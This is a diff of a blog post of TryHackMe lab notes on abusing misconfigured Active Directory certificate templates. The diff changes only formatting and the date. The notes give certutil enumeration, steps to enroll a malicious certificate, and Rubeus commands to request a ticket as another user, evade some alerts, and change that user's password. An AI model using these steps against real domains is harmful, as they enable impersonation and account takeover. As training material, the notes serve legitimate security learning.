@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Jr. Penetration Tester (Supplements)'
-date: 2022-05-10 05:00:00.000000000 Z
+date: 2022-05-10 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2022-05-10-tryhackme-jr-penetration-tester-supplements.html
 author: 100007
@@ -13,14 +13,14 @@ author: 100007
 <ul>
 <li><a href="https://tryhackme.com/room/adcertificatetemplates">TryHackMe: AD Certificate Templates</a></li>
 </ul>
-<h3 id="introduction-ad-certificate-templates">Introduction: AD Certificate Templates</h3>
+<h2 id="introduction-ad-certificate-templates">Introduction: AD Certificate Templates</h2>
 <p>This room is based on SpectreOps’ “Certified Pre-Owned” research, and will deal with misconfigured templated in the Active Directory Certificate Service (AD CS).</p>
 <ul>
 <li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">SpectreOps: Certified Pre-Owned</a></li>
 </ul>
-<h3 id="a-brief-look-at-certificate-templates">A Brief Look at Certificate Templates</h3>
+<h2 id="a-brief-look-at-certificate-templates">A Brief Look at Certificate Templates</h2>
 <p>AD CS is AD’s PKI, and is used on the back end for everything from provisioning disk encryption keys to user authentication. Certificate templates are a way to automate the certificate request process: Rather than an admin approving all CSRs manually, AD CS checks to see if a relevant “template” (which is really a template + associated settings + an access policy) exists that matches the supplied CSR and is configured to allow the requesting user to generate a certificate.</p>
-<h3 id="certificate-template-enumeration">Certificate Template Enumeration</h3>
+<h2 id="certificate-template-enumeration">Certificate Template Enumeration</h2>
 <p>Enumerate all certificate templates from a domain-joined computer and domain-authenticated user:</p>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certutil</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-template</span><span class="w">
 </span></code></pre></div></div>
@@ -38,7 +38,7 @@ author: 100007
 <ul>
 <li><a href="https://cardboard-iguana.com/notes/kerberos.html">Kerberos</a></li>
 </ul>
-<h3 id="generating-a-malicious-certificate">Generating a Malicious Certificate</h3>
+<h2 id="generating-a-malicious-certificate">Generating a Malicious Certificate</h2>
 <ul>
 <li>Open up the Microsoft Management Console (<code class="language-plaintext highlighter-rouge">mmc</code>).</li>
 <li>Add the “Certificates” snap-in. (If you have local admin, you’ll be able to add the snap-in for local service accounts or the machine account itself.)</li>
@@ -48,22 +48,22 @@ author: 100007
 <li>Enroll!</li>
 </ul>
 <p>The vulnerable cert will be added under the “Personal” folder that was initially clicked on. Once the certificate has been generated, export it (be sure to include the associated private key!) for use in other exploitation tools.</p>
-<h3 id="user-impersonation-through-a-certificate">User Impersonation Through a Certificate</h3>
+<h2 id="user-impersonation-through-a-certificate">User Impersonation Through a Certificate</h2>
 <p>Rubeus can be used to request a Kerberos ticket granting ticket using the certificate:</p>
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:</span><span class="nv">$USER</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/enctype:aes256</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/certificate:</span><span class="nv">$CERTIFICATE_FILE</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/password:</span><span class="nv">$CERTIFICATE_FILE_PASSWORD</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/outfile:</span><span class="nv">$TICKET_FILE</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/domain:</span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/dc:</span><span class="nv">$DC_IP_ADDRESS</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:</span><span class="nv">$USER</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/enctype:aes256</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/certificate:</span><span class="nv">$CERTIFICATE_FILE</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/password:</span><span class="nv">$CERTIFICATE_FILE_PASSWORD</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/outfile:</span><span class="nv">$TICKET_FILE</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/domain:</span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/dc:</span><span class="nv">$DC_IP_ADDRESS</span><span class="w">
 </span></code></pre></div></div>
 <p>Here we explode the UPN of the user we’re going to impersonate between the <code class="language-plaintext highlighter-rouge">/user</code> and <code class="language-plaintext highlighter-rouge">/domain</code> flags; using <code class="language-plaintext highlighter-rouge">/enctype:aes256</code> will prevent some alerts from being generated. TryHackMe recommends using the same domain controller that the CA service is running on. Once we have the ticket (in <code class="language-plaintext highlighter-rouge">$TICKET_FILE</code>), we can feed it into our favorite tool for actual exploitation.</p>
 <p>Change a user’s password with Rubeus:</p>
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">changepw</span><span class="w"> </span><span class="nx">/ticket:</span><span class="nv">$TICKET_FILE</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/new:</span><span class="nv">$NEW_PASSWORD</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/dc:</span><span class="nv">$DC_IP_ADDRESS</span><span class="w"> </span><span class="nx">\</span><span class="w">
-</span><span class="n">/targetuser:</span><span class="nv">$DOMAIN</span><span class="nx">\</span><span class="nv">$USER</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">changepw</span><span class="w"> </span><span class="nx">/ticket:</span><span class="nv">$TICKET_FILE</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/new:</span><span class="nv">$NEW_PASSWORD</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/dc:</span><span class="nv">$DC_IP_ADDRESS</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">/targetuser:</span><span class="nv">$DOMAIN</span><span class="nx">\</span><span class="nv">$USER</span><span class="w">
 </span></code></pre></div></div>
 <p>Use <code class="language-plaintext highlighter-rouge">runas</code> to open a command prompt as another user:</p>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/user:</span><span class="nv">$DOMAIN</span><span class="nx">\</span><span class="nv">$USER</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
